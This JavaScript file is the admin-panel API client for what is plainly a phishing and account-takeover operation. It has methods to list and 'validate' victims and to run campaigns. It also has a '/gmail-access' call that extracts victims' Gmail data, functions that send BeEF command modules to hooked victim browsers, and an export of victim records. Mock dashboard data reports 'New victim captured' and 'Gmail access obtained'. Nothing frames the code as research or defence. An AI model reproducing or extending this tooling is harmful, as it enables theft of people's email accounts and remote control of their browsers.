/**
 * Admin API Client
 * Handles all API communication with the backend
 */

class AdminAPIClient {
    static baseURL = '/api/admin';
    static token = null;

    static setAuthToken(token) {
        this.token = token;
        if (token) {
            localStorage.setItem('admin_token', token);
        } else {
            localStorage.removeItem('admin_token');
        }
    }

    static getAuthToken() {
        if (!this.token) {
            this.token = localStorage.getItem('admin_token');
        }
        return this.token;
    }

    static getHeaders() {
        const headers = {
            'Content-Type': 'application/json',
        };

        const token = this.getAuthToken();
        if (token) {
            headers['Authorization'] = `Bearer ${token}`;
        }

        return headers;
    }

    static async request(endpoint, options = {}) {
        const url = `${this.baseURL}${endpoint}`;
        const config = {
            headers: this.getHeaders(),
            ...options
        };

        try {
            const response = await fetch(url, config);

            // Handle authentication errors
            if (response.status === 401) {
                this.setAuthToken(null);
                window.location.href = 'index.html';
                throw new Error('Authentication required');
            }

            // Handle other HTTP errors
            if (!response.ok) {
                const error = await response.json().catch(() => ({ detail: 'Unknown error' }));
                throw new Error(error.detail || `HTTP ${response.status}`);
            }

            return await response.json();
        } catch (error) {
            if (error.message === 'Authentication required') {
                throw error;
            }
            console.error('API request failed:', error);
            throw new Error(`API request failed: ${error.message}`);
        }
    }

    // Authentication methods
    static async login(username, password) {
        try {
            const response = await fetch('/api/auth/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username,
                    password
                })
            });

            const data = await response.json();

            if (response.ok && data.success) {
                this.setAuthToken(data.token);
                return data;
            } else {
                throw new Error(data.detail || 'Login failed');
            }
        } catch (error) {
            console.error('Login error:', error);
            throw error;
        }
    }

    static async logout() {
        try {
            await this.request('/auth/logout', { method: 'POST' });
        } catch (error) {
            console.warn('Logout API call failed:', error);
        } finally {
            this.setAuthToken(null);
        }
    }

    // Dashboard API methods
    static async getDashboardStats() {
        return await this.request('/dashboard');
    }

    static async getRealtimeDashboard() {
        return await this.request('/dashboard/realtime');
    }

    // Victim management methods
    static async getVictims(page = 1, pageSize = 50, filters = null) {
        let endpoint = `/victims?page=${page}&page_size=${pageSize}`;
        if (filters) {
            endpoint += `&filters=${encodeURIComponent(filters)}`;
        }
        return await this.request(endpoint);
    }

    static async getVictimDetails(victimId) {
        return await this.request(`/victims/${victimId}`);
    }

    static async validateVictim(victimId) {
        return await this.request(`/victims/${victimId}/validate`, {
            method: 'POST'
        });
    }

    // Campaign management methods
    static async getCampaigns() {
        return await this.request('/campaigns');
    }

    static async createCampaign(campaignData) {
        return await this.request('/campaigns', {
            method: 'POST',
            body: JSON.stringify(campaignData)
        });
    }

    // Gmail access methods
    static async accessGmail(victimId, accessMethod = 'oauth', extractionConfig = {}) {
        return await this.request('/gmail-access', {
            method: 'POST',
            body: JSON.stringify({
                victim_id: victimId,
                access_method: accessMethod,
                extraction_config: extractionConfig
            })
        });
    }

    static async getGmailData(victimId) {
        return await this.request(`/gmail-access/${victimId}/data`);
    }

    // BeEF control methods
    static async getBeEFHooks() {
        return await this.request('/beef/hooks');
    }

    static async executeBeEFCommand(hookId, commandModule, parameters = {}) {
        return await this.request('/beef/execute', {
            method: 'POST',
            body: JSON.stringify({
                hook_id: hookId,
                command_module: commandModule,
                parameters: parameters
            })
        });
    }

    // Activity logs methods
    static async getActivityLogs(page = 1, pageSize = 50) {
        return await this.request(`/activity-logs?page=${page}&page_size=${pageSize}`);
    }

    // System health methods
    static async getSystemHealth() {
        try {
            const response = await fetch('/health/detailed');
            return await response.json();
        } catch (error) {
            console.error('Health check failed:', error);
            return { status: 'unknown', error: error.message };
        }
    }

    // Statistics and analytics methods
    static async getStatistics(timeRange = '30') {
        try {
            const response = await fetch(`/api/admin/statistics?days=${timeRange}`);
            if (response.ok) {
                return await response.json();
            }
            throw new Error('Failed to fetch statistics');
        } catch (error) {
            console.error('Statistics fetch failed:', error);
            return this.getMockStatistics();
        }
    }

    static getMockStatistics() {
        return {
            total_partners: Math.floor(Math.random() * 1000) + 500,
            active_victims: Math.floor(Math.random() * 100) + 50,
            gmail_access: Math.floor(Math.random() * 50) + 20,
            beef_sessions: Math.floor(Math.random() * 30) + 10,
            recent_activities: [
                {
                    id: 1,
                    type: 'victim',
                    title: 'New victim captured',
                    description: 'victim@example.com registered',
                    timestamp: new Date(Date.now() - Math.random() * 86400000).toISOString()
                },
                {
                    id: 2,
                    type: 'gmail',
                    title: 'Gmail access obtained',
                    description: 'Successfully accessed victim Gmail',
                    timestamp: new Date(Date.now() - Math.random() * 86400000).toISOString()
                }
            ]
        };
    }

    // Data export methods
    static async exportData(format = 'json', dataType = 'victims') {
        try {
            const response = await fetch(`/api/admin/export/${dataType}?format=${format}`, {
                headers: this.getHeaders()
            });

            if (response.ok) {
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `${dataType}_export_${new Date().toISOString().split('T')[0]}.${format}`;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
                return true;
            } else {
                throw new Error('Export failed');
            }
        } catch (error) {
            console.error('Export error:', error);
            throw error;
        }
    }

    // Real-time data methods
    static async subscribeToUpdates(callback) {
        // This would typically use WebSocket, but for now we'll poll
        const pollInterval = setInterval(async () => {
            try {
                const data = await this.getRealtimeDashboard();
                if (callback) {
                    callback(data);
                }
            } catch (error) {
                console.error('Real-time update failed:', error);
            }
        }, 5000);

        return () => clearInterval(pollInterval);
    }

    // Utility methods
    static async testConnection() {
        try {
            const health = await this.getSystemHealth();
            return health.status === 'healthy';
        } catch (error) {
            console.error('Connection test failed:', error);
            return false;
        }
    }

    static handleApiError(error) {
        console.error('API Error:', error);

        // Show user-friendly error message
        if (error.message.includes('Authentication required')) {
            // Redirect to login
            window.location.href = 'index.html';
        } else {
            // Show error notification using console for now
            console.error('API Error:', error.message);
            // You could implement a custom notification system here
        }
    }
}

// Export for use in other modules
window.AdminAPIClient = AdminAPIClient;